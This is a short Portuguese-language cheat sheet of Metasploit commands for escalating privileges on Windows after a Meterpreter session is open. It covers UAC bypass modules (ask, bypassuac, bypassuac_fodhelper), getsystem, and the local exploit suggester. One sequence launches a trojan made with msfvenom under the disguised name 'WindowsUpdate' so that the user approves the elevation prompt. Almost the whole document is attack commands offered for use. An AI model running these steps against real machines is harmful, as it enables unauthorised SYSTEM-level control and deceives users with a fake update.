### Escalação de privilégio ***com interação do usuário***
~~~~
getuid
getprivs
getsystem -h
~~~~
Depois de criar o cavalo de troia através do MSFVENOM faça:
~~~~
metasploit
meterpreter> background
exploit (multi/handler)> search uac
use exploit/windows/local/ask

exploit (windows/local/ask) > set FILE_NAME WindowsUpdate
exploit (windows/local/ask)> session 1
exploit (windows/local/ask)> technique PSH
exploit (windows/local/ask)> run
exploit (windows/local/ask)> sessions -i 2
~~~~

### Escalação de privilégio ***sem interação do usuário***

1ª tentativa
~~~~
use exploit/windows/local/bypassuac
set session 1 
run
~~~~
2ª tentativa
~~~~
use exploit/windows/local/bypassuac_fodhelper
exploit (windows/local/bypassuac_fodhelper)> set session 1 
exploit(windows/local/bypassuac_fodhelper)> run
meterpreter> getsystem
~~~~

Escalonamento de privilégios através de uma opção pré-instalada no Metasploit que oferece exploits de acordo com parâmetros do Windows
~~~~
exploit(multi/handler)> use post/multi/recon/local_exploit_suggester
exploit(multi/handler)> set session 1 
exploit(multi/handler)> run
~~~~
